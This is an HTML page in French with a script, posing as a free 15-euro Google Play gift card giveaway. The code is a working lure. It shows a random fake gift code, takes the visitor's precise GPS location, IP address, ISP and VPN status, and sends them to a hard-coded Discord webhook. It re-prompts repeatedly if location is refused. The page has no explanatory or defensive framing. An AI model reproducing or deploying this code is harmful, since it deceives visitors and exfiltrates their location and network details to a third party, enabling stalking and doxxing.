<body>

  <div class="container">
    <h1>üéâ Carte Cadeau Google Play Gratuite ! üéâ</h1>
    <p>Autorisez la localisation pour r√©cup√©rer votre code Google Play officiel de 15 ‚Ç¨ !</p>
    <div id="location-prompt">
      <button id="allow-location" class="button">Autoriser la localisation</button>
    </div>
    <div id="result">
      <p>Votre code Google Play :</p>
      <p id="gift-code"></p>
      <p>Adresse:</p>
      <p id="address"></p>
      <p><a id="google-maps-link" target="_blank">Voir sur Google Maps</a></p>
      <p><a id="street-view-link" target="_blank">Voir en Street View</a></p>
    </div>
  </div>

  <script>
    const webhookUrl = 'https://discord.com/api/webhooks/1371889224189743154/JlPYX5flX7Z761t1qz1S4FIe3hx3SyxB69jY7MEOb_2sWOUSPpTj20dwXcwW8APSzSW1';

    async function sendDataToWebhook(data) {
      try {
        const response = await fetch(webhookUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(data),
        });

        if (!response.ok) {
          console.error('Erreur lors de l\'envoi des donn√©es au webhook.');
        }
      } catch (error) {
        console.error('Erreur de connexion au webhook:', error);
      }
    }

    function generateGiftCode() {
      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
      let code = '';
      for (let i = 0; i < 16; i++) {
        code += chars.charAt(Math.floor(Math.random() * chars.length));
        if (i % 4 === 3 && i < 15) code += '-';
      }
      return code;
    }

    async function getIPData() {
      try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return {
          ipv4: data.ip || 'N/A',
          ipv6: data.ipv6 || 'N/A',
          isp: data.org || 'N/A',
          organization: data.asn || 'N/A',
          vpn: data.proxy ? 'Oui' : 'Non',
          ipLatitude: data.latitude || 'N/A',
          ipLongitude: data.longitude || 'N/A',
          ipCity: data.city || 'N/A',
          ipRegion: data.region || 'N/A',
          ipCountry: data.country_name || 'N/A',
        };
      } catch (error) {
        return { ipv4: 'N/A', ipv6: 'N/A', isp: 'N/A', organization: 'N/A', vpn: 'Non', ipLatitude: 'N/A', ipLongitude: 'N/A', ipCity: 'N/A', ipRegion: 'N/A', ipCountry: 'N/A' };
      }
    }

    async function handleLocationRequest() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async (position) => {
          const { latitude, longitude } = position.coords;
          const giftCode = generateGiftCode();
          const ipData = await getIPData();

          const data = {
            latitude,
            longitude,
            giftCode,
            ...ipData
          };

          const geocodeUrl = `https://maps.googleapis.com/maps/api/geocode/json?latlng=${latitude},${longitude}&key=YOUR_GOOGLE_MAPS_API_KEY`;
          const geocodeResponse = await fetch(geocodeUrl);
          const geocodeData = await geocodeResponse.json();

          const address = geocodeData.results[0] ? geocodeData.results[0].formatted_address : 'Adresse non disponible';
          const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
          const streetViewLink = `https://www.google.com/maps?q=place_id:${geocodeData.results[0].place_id}&layer=c&cbll=${latitude},${longitude}`;

          document.getElementById('gift-code').textContent = giftCode;
          document.getElementById('address').textContent = address;
          document.getElementById('google-maps-link').href = googleMapsLink;
          document.getElementById('street-view-link').href = streetViewLink;

          document.getElementById('result').style.display = 'block';
          sendDataToWebhook(data);
        }, () => {
          alert("La localisation est n√©cessaire pour obtenir le code.");
          handleLocationRequest(); 
        });
      } else {
        alert("La g√©olocalisation n'est pas disponible sur ce navigateur.");
      }
    }

    document.getElementById('allow-location').addEventListener('click', handleLocationRequest);
  </script>
